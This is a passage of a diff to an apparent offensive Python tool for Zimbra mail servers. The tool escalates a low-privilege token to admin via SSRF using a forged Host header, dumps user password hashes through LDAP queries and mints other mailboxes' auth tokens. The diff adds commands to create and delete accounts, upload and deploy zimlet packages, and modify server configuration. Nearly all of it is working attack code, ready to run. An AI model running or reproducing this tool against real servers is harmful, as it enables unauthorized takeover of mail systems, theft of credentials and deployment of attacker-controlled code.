+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <ReloadMemcachedClientConfigRequest xmlns="urn:zimbraAdmin">
+         </ReloadMemcachedClientConfigRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """  
+    try:
+        print("[*] Try to reload memcached config")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
+        print("    ok")
+        print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
+def reloadmemcachedconfig_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <ReloadMemcachedClientConfigRequest xmlns="urn:zimbraAdmin">
+         </ReloadMemcachedClientConfigRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """  
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to reload memcached config")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
+        print("    ok")
+        print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
 
 def getldapentries_request(uri,token,query,ldapSearchBase):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -456,7 +1338,6 @@ def getldapentries_request(uri,token,query,ldapSearchBase):
         print(r.text)
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getldapentries_requestSSRF(uri,token,query,ldapSearchBase):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -485,7 +1366,6 @@ def getldapentries_requestSSRF(uri,token,query,ldapSearchBase):
         print(r.text)
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getalluserhash(uri,token,query,ldapSearchBase):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -521,7 +1401,6 @@ def getalluserhash(uri,token,query,ldapSearchBase):
 
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getalluserhashSSRF(uri,token,query,ldapSearchBase):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -563,7 +1442,6 @@ def getalluserhashSSRF(uri,token,query,ldapSearchBase):
 
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def gettoken_request(uri,token):
     print("[*] Input the mailbox:")
@@ -590,7 +1468,6 @@ def gettoken_request(uri,token):
             print("[+] authTOken:%s"%(token[0]))
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def gettoken_requestSSRF(uri,token):
     print("[*] Input the mailbox:")
@@ -623,7 +1500,6 @@ def gettoken_requestSSRF(uri,token):
             print("[+] authTOken:%s"%(token[0]))
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def upload_request(uri,token):
     fileContent = 0;
@@ -641,7 +1517,6 @@ def upload_request(uri,token):
     headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
 
     m = MultipartEncoder(fields={
-    'filename':(None,"test",None),
     'clientFile':(filename,fileContent,"image/jpeg")
     }, boundary = '----WebKitFormBoundary1abcdefghijklmno')
 
@@ -652,7 +1527,41 @@ def upload_request(uri,token):
     else:
         print("[!]")
         print(r.text)  
-        exit(0)
+
+def uploadzimlet_request(uri,token):
+    fileContent = 0;
+    path = input("[*] Input the path of the file:")
+    with open(path,'rb') as f:
+        fileContent = f.read()
+    filename = path
+    print("[*] filepath:"+path)
+    if "\\" in path:
+        strlist = path.split('\\')
+        filename = strlist[-1]
+    if "/" in path:  
+        strlist = path.split('/')
+        filename = strlist[-1]    
+    headers = {
+    "Content-Type":"application/xml"
+    }   
+    headers["Content-Type"]="multipart/form-data; boundary=----WebKitFormBoundary1abcdefghijklmno"
+    headers["Cookie"]="ZM_AUTH_TOKEN="+token+";"
+
+    m = MultipartEncoder(fields={
+    'clientFile':(filename,fileContent,'application/zip')
+    }, boundary = '----WebKitFormBoundary1abcdefghijklmno')
+
+    r = requests.post(uri+"/service/upload",data=m,headers=headers,verify=False)
+    if "200" in r.text:
+        print("[+] Success")
+        pattern_id = re.compile(r"\',\'(.*?)\'")
+        attachmentid = pattern_id.findall(r.text)[0]
+        print("    name:"+filename) 
+        print("    Id:%s"%(attachmentid))
+        return attachmentid
+    else:
+        print("[!]")
+        print(r.text)
 
 def getalladdresslists_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -676,7 +1585,6 @@ def getalladdresslists_request(uri,token):
 
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getcontacts_request(uri,token,email):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -700,7 +1608,6 @@ def getcontacts_request(uri,token,email):
         print(data[0])      
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getfolder_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -726,7 +1633,6 @@ def getfolder_request(uri,token):
           print("[+] Name:%s,Size:%s"%(name[i],size[i]))
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getitem_request(uri,token,path):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -752,7 +1658,6 @@ def getitem_request(uri,token,path):
         print(data[0])
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 def getmsg_request(uri,token,id):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -776,7 +1681,6 @@ def getmsg_request(uri,token,id):
         print(r.text)
     except Exception as e:
         print("[!] Error:%s"%(e))
-        exit(0)
 
 if __name__ == '__main__':
   if len(sys.argv)!=5:
@@ -838,32 +1742,76 @@ if __name__ == '__main__':
       admin_token = auth_request_admin(sys.argv[1],sys.argv[2],sys.argv[3])
       print("[*] Command Mode")
       print("Supprot command:")
+      print("      CreateAccount")
+      print("      DeleteAccount")
+      print("      DeployZimlet")
+      print("      UndeployZimlet")      
+      print("      DeleteZimlet")
+      print("      GetAllZimlet")
+      print("      GetAccount")      
       print("      GetAllDomains")      
       print("      GetAllMailboxes")
       print("      GetAllAccounts")
       print("      GetAllAdminAccounts")
+      print("      GetAllConfig")
       print("      GetMemcachedClientConfig")
       print("      GetLDAPEntries")
+      print("      GetServer")
+      print("      GetServerNIfs")
+      print("      GetServiceStatus")
       print("      GetToken")      
       print("      getalluserhash")
+      print("      ModifyConfig")
+      print("      ModifyServer")
+      print("      ReloadMemcachedClientConfig")
       print("      upload")
+      print("      uploadzimlet")
       print("      help")
       print("      exit")
       while(1):
         cmd = input("[$] ")
         if cmd=='help':
           print("Supprot command:")
+          print("      CreateAccount")
+          print("      DeleteAccount")
+          print("      DeployZimlet")
+          print("      UndeployZimlet")
+          print("      DeleteZimlet")
+          print("      GetAllZimlet")
+          print("      GetAccount")
           print("      GetAllDomains")
           print("      GetAllMailboxes")
           print("      GetAllAccounts")
           print("      GetAllAdminAccounts")
+          print("      GetAllConfig")
           print("      GetMemcachedClientConfig")
           print("      GetLDAPEntries")
+          print("      GetServer")
+          print("      GetServerNIfs")
+          print("      GetServiceStatus")          
           print("      GetToken")      
           print("      getalluserhash")
+          print("      ModifyConfig")
+          print("      ModifyServer")
+          print("      ReloadMemcachedClientConfig")
           print("      upload")
+          print("      uploadzimlet")
           print("      help")
-          print("      exit")         
+          print("      exit")
+        elif cmd=='CreateAccount':
+          createaccount_request(sys.argv[1],admin_token)
+        elif cmd=='DeleteAccount':
+          deleteaccount_request(sys.argv[1],admin_token)
+        elif cmd=='DeployZimlet':
+          deployzimlet_request(sys.argv[1],admin_token)
+        elif cmd=='UndeployZimlet':
+          undeployzimlet_request(sys.argv[1],admin_token)          
+        elif cmd=='DeleteZimlet':
+          deletezimlet_request(sys.argv[1],admin_token)
+        elif cmd=='GetAllZimlet':
+          getallzimlet_request(sys.argv[1],admin_token)
+        elif cmd=='GetAccount':
+          getaccount_request(sys.argv[1],admin_token)
         elif cmd=='GetAllDomains':          
           getalldomains_request(sys.argv[1],admin_token)
         elif cmd=='GetAllMailboxes':
@@ -872,6 +1820,8 @@ if __name__ == '__main__':
           getallaccounts_request(sys.argv[1],admin_token)
         elif cmd=='GetAllAdminAccounts':
           getalladminaccounts_request(sys.argv[1],admin_token)
+        elif cmd=='GetAllConfig':
+          getallconfig_request(sys.argv[1],admin_token)          
         elif cmd=='GetMemcachedClientConfig':
           getmemcachedconfig_request(sys.argv[1],admin_token)
         elif cmd=='GetLDAPEntries':
@@ -890,10 +1840,24 @@ if __name__ == '__main__':
           print("dc=zimbra,dc=com")
           ldapSearchBase = input("[>]:")          
           getalluserhash(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
+        elif cmd=='GetServer':
+          getserver_request(sys.argv[1],admin_token)
+        elif cmd=='GetServerNIfs':
+          getservernifs_request(sys.argv[1],admin_token)
+        elif cmd=='GetServiceStatus':
+          getservicestats_request(sys.argv[1],admin_token)
         elif cmd=='GetToken':
           gettoken_request(sys.argv[1],admin_token)
+        elif cmd=='ModifyConfig':
+          modifyconfig_request(sys.argv[1],admin_token)
+        elif cmd=='ModifyServer':
+          modifyserver_request(sys.argv[1],admin_token)
+        elif cmd=='ReloadMemcachedClientConfig':
+          reloadmemcachedconfig_request(sys.argv[1],admin_token)
         elif cmd=='upload':
-          upload_request(sys.argv[1],admin_token)            
+          upload_request(sys.argv[1],admin_token)
+        elif cmd=='uploadzimlet':
+          uploadzimlet_request(sys.argv[1],admin_token)
         elif cmd=='exit':
           exit(0)
         else:
@@ -904,48 +1868,120 @@ if __name__ == '__main__':
       admin_token = lowtoken_to_admintoken_by_SSRF(sys.argv[1],sys.argv[2],sys.argv[3])
       print("[*] Command Mode")
       print("Supprot command:")
+      print("      CreateAccount")
+      print("      DeleteAccount")
+      print("      DeployZimlet")
+      print("      UndeployZimlet")
+      print("      DeleteZimlet")
+      print("      GetAllZimlet")
+      print("      GetAccount")
       print("      GetAllDomains")
       print("      GetAllMailboxes")
       print("      GetAllAccounts")
       print("      GetAllAdminAccounts")
+      print("      GetAllConfig")
       print("      GetMemcachedClientConfig")
       print("      GetLDAPEntries")
+      print("      ModifyConfig")
+      print("      GetServer")
+      print("      GetServerNIfs")
+      print("      GetServiceStatus")
       print("      GetToken")      
       print("      getalluserhash")
+      print("      ModifyServer")
+      print("      ReloadMemcachedClientConfig")
       print("      upload")
+      print("      uploadzimlet")
+      print("      CreateAccountSSRF")
+      print("      DeleteAccountSSRF")
+      print("      DeployZimletSSRF")
+      print("      UndeployZimletSSRF")
+      print("      DeleteZimletSSRF")
+      print("      GetAllZimletSSRF")
+      print("      GetAccountSSRF")
       print("      GetAllDomainsSSRF")
       print("      GetAllMailboxesSSRF")
       print("      GetAllAccountsSSRF")
       print("      GetAllAdminAccountsSSRF")
+      print("      GetAllConfigSSRF")
       print("      GetMemcachedClientConfigSSRF")
       print("      GetLDAPEntriesSSRF")
+      print("      GetServerSSRF")
+      print("      GetServerNIfsSSRF")
+      print("      GetServiceStatusSSRF")
       print("      GetTokenSSRF")      
       print("      getalluserhashSSRF")
+      print("      ModifyConfigSSRF")
+      print("      ModifyServerSSRF")
+      print("      ReloadMemcachedClientConfigSSRF")
       print("      help")
       print("      exit")
       while(1):
         cmd = input("[$] ")
         if cmd=='help':
           print("Supprot command:")
+          print("      CreateAccount")
+          print("      DeleteAccount")
+          print("      DeployZimlet")
+          print("      UndeployZimlet")
+          print("      DeleteZimlet")
+          print("      GetAllZimlet")
+          print("      GetAccount")
           print("      GetAllDomains")
           print("      GetAllMailboxes")
           print("      GetAllAccounts")
           print("      GetAllAdminAccounts")
+          print("      GetAllConfig")
           print("      GetMemcachedClientConfig")
           print("      GetLDAPEntries")
+          print("      GetServer")
+          print("      GetServerNIfs")
+          print("      GetServiceStatus")          
           print("      GetToken")      
           print("      getalluserhash")
+          print("      ModifyConfig")
+          print("      ModifyServer")
+          print("      ReloadMemcachedClientConfig")
           print("      upload")
+          print("      uploadzimlet")
+          print("      CreateAccountSSRF")
+          print("      DeleteAccountSSRF")
+          print("      DeployZimletSSRF")
+          print("      UndeployZimletSSRF")
+          print("      DeleteZimletSSRF")
+          print("      GetAllZimletSSRF")
+          print("      GetAccountSSRF")
           print("      GetAllDomainsSSRF")
           print("      GetAllMailboxesSSRF")
           print("      GetAllAccountsSSRF")
           print("      GetAllAdminAccountsSSRF")
+          print("      GetAllConfigSSRF")
           print("      GetMemcachedClientConfigSSRF")
           print("      GetLDAPEntriesSSRF")
+          print("      GetServerSSRF")
+          print("      GetServerNIfsSSRF")
+          print("      GetServiceStatusSSRF")
           print("      GetTokenSSRF")      
-          print("      getalluserhashSSRF")          
+          print("      getalluserhashSSRF")
+          print("      ModifyConfigSSRF")
+          print("      ModifyServerSSRF")
+          print("      ReloadMemcachedClientConfigSSRF")
           print("      help")
           print("      exit")
+        elif cmd=='CreateAccount':          
+          createaccount_request(sys.argv[1],admin_token)
+        elif cmd=='DeleteAccount':
+          deleteaccount_request(sys.argv[1],admin_token)
+        elif cmd=='DeployZimlet':
+          deployzimlet_request(sys.argv[1],admin_token)
+        elif cmd=='UndeployZimlet':
+          undeployzimlet_request(sys.argv[1],admin_token)          
+        elif cmd=='DeleteZimlet':
+          deletezimlet_request(sys.argv[1],admin_token)
+        elif cmd=='GetAllZimlet':
+          getallzimlet_request(sys.argv[1],admin_token)                   
+        elif cmd=='GetAccount':
+          getaccount_request(sys.argv[1],admin_token)          
         elif cmd=='GetAllDomains':          
           getalldomains_request(sys.argv[1],admin_token)
         elif cmd=='GetAllMailboxes':
@@ -954,6 +1990,8 @@ if __name__ == '__main__':
           getallaccounts_request(sys.argv[1],admin_token)
         elif cmd=='GetAllAdminAccounts':
           getalladminaccounts_request(sys.argv[1],admin_token)
+        elif cmd=='GetAllConfig':
+          getallconfig_request(sys.argv[1],admin_token)          
         elif cmd=='GetMemcachedClientConfig':
           getmemcachedconfig_request(sys.argv[1],admin_token)
         elif cmd=='GetLDAPEntries':
@@ -972,10 +2010,38 @@ if __name__ == '__main__':
           print("dc=zimbra,dc=com")
           ldapSearchBase = input("[>]:")          
           getalluserhash(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
+        elif cmd=='ModifyConfig':
+          modifyconfig_request(sys.argv[1],admin_token)          
+        elif cmd=='GetServer':
+          getserver_request(sys.argv[1],admin_token)
+        elif cmd=='GetServerNIfs':
+          getservernifs_request(sys.argv[1],admin_token)        
+        elif cmd=='GetServiceStatus':
+          getservicestats_request(sys.argv[1],admin_token)          
         elif cmd=='GetToken':
           gettoken_request(sys.argv[1],admin_token)
+        elif cmd=='ModifyServer':
+          modifyserver_request(sys.argv[1],admin_token)
+        elif cmd=='ReloadMemcachedClientConfig':
+          reloadmemcachedconfig_request(sys.argv[1],admin_token)
         elif cmd=='upload':
           upload_request(sys.argv[1],admin_token)
+        elif cmd=='uploadzimlet':
+          uploadzimlet_request(sys.argv[1],admin_token)          
+        elif cmd=='CreateAccountSSRF':          
+          createaccount_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='DeleteAccountSSRF':
+          deleteaccount_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='DeployZimletSSRF':
+          deployzimlet_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='UndeployZimletSSRF':
+          undeployzimlet_requestSSRF(sys.argv[1],admin_token)          
+        elif cmd=='DeleteZimletSSRF':
+          deletezimlet_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='GetAllZimletSSRF':
+          getallzimlet_requestSSRF(sys.argv[1],admin_token)          
+        elif cmd=='GetAccountSSRF':
+          getaccount_requestSSRF(sys.argv[1],admin_token)          
         elif cmd=='GetAllDomainsSSRF':          
           getalldomains_requestSSRF(sys.argv[1],admin_token)
         elif cmd=='GetAllMailboxesSSRF':
@@ -984,6 +2050,8 @@ if __name__ == '__main__':
           getallaccounts_requestSSRF(sys.argv[1],admin_token)
         elif cmd=='GetAllAdminAccountsSSRF':
           getalladminaccounts_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='GetAllConfigSSRF':
+          getallconfig_requestSSRF(sys.argv[1],admin_token)          
         elif cmd=='GetMemcachedClientConfigSSRF':
           getmemcachedconfig_requestSSRF(sys.argv[1],admin_token)
         elif cmd=='GetLDAPEntriesSSRF':
@@ -1002,8 +2070,20 @@ if __name__ == '__main__':
           print("dc=zimbra,dc=com")
           ldapSearchBase = input("[>]:")          
           getalluserhashSSRF(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
+        elif cmd=='GetServerSSRF':
+          getserver_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='GetServerNIfsSSRF':
+          getservernifs_requestSSRF(sys.argv[1],admin_token)          
+        elif cmd=='GetServiceStatusSSRF':
+          getservicestats_requestSSRF(sys.argv[1],admin_token)                    
         elif cmd=='GetTokenSSRF':
           gettoken_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='ModifyConfigSSRF':
+          modifyconfig_requestSSRF(sys.argv[1],admin_token)          
+        elif cmd=='ModifyServerSSRF':
+          modifyserver_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='ReloadMemcachedClientConfigSSRF':
+          reloadmemcachedconfig_requestSSRF(sys.argv[1],admin_token)         
         elif cmd=='exit':
           exit(0)
         else:
